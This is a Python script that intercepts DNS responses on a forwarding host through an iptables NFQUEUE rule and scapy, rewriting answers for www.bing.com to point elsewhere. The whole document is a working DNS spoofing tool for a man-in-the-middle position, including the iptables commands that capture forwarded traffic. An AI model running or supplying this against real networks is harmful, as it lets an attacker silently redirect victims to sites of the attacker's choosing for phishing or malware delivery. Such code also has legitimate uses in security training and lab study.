# first install nfilterqueue module
# next create the queue with iptable
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# locally iptables -I INOUT -j NFQUEUE --queue-num 0
# iptables -I OUTPUT -j NFQUEUE --queue-num 0

import netfilterqueue as nfq
from termcolor import colored
from os import getuid
from subprocess import call
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # convert to scapy packet
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        site = b"www.bing.com"
        if site in qname:
            print(f"{colored('[*]', 'blue')} Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata='www.google.com')
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            
            packet.set_payload(bytes(scapy_packet))
            

    packet.accept()


def check_sudo():
    if getuid() != 0:
        print(
            f"{colored('[-]', 'red')} You must be super user to run this script")
        exit(1)


check_sudo()
call('iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
queue = nfq.NetfilterQueue()
# bind the queue to the one create with iptables
queue.bind(0, process_packet)
try:
    print(f"{colored('[!]', 'cyan')} Running")
    queue.run()
except KeyboardInterrupt:
    print(f"\n{colored('[!]', 'red')} Exit")
    call('iptables -D FORWARD -j NFQUEUE --queue-num 0', shell=True)
